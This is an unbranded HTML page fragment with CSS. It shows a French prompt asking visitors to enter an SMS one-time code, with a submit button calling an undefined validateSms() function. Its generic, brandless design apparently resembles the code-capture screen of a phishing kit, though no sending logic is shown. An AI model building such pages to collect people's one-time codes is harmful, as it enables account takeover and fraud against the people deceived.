   <title>OTP Verification Form</title>

  <body>
  	   
  	<center>
  	<div class="dagaCode">
	<b style="color:#438600">Veuillez entrer le code que nous vous avons envoye par SMS sur votre téléphone mobile</b>
	  </div>
    <div class="container">
 
<img style="margin-bottom:10px" width="200" src="https://st4.depositphotos.com/4071691/28112/v/450/depositphotos_281122906-stock-illustration-unread-email-notification-new-message.jpg">
    
	<p>Code sms:</p>
  

	<div id="er-sms" style="background:#FFD5D5;color:#853737;padding:8px;border-radius:2px;margin:0 0 10px 0;text-align:left;display:none;">
		<span>Les informations sont incorrectes, veuillez vérifier à nouveau</span>
		</div>
    <input type="number" placeholder="sms" class="smscode" required>
 
    <button class="btnvaSms" onclick="validateSms()">Valider</button>
</div>
    
    </center>
    
    
    <style>
    	

:where(.container, form, .input-field, header) {
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
}
.container {
  border: solid 1.5px #CACACA;
  max-width: 500px;
  margin:10px;
  padding:10px;
  border-radius: 5px;

  
}
.container h4 {
  font-size: 1.25rem;
  color: #333;
  font-weight: 500;
}

.input-field input {
  height: 45px;
  width: 90%;
  border-radius: 6px;
  outline: none;
  font-size: 1.125rem;
  text-align: center;
  border: 1px solid #ddd;
}
.input-field input:focus {
  box-shadow: 0 1px 0 rgba(0, 0, 0, 0.1);
}

form button {
  margin-top: 25px;
  width: 100%;
  color: #fff;
  font-size: 1rem;
  border: none;
  padding: 9px 0;
  cursor: pointer;
  border-radius: 6px;
  pointer-events: none;
  background: #4070f4;
  transition: all 0.2s ease;
}

form button:hover {
  background: #0e4bf1;
}
*{
font-family:normal;

}
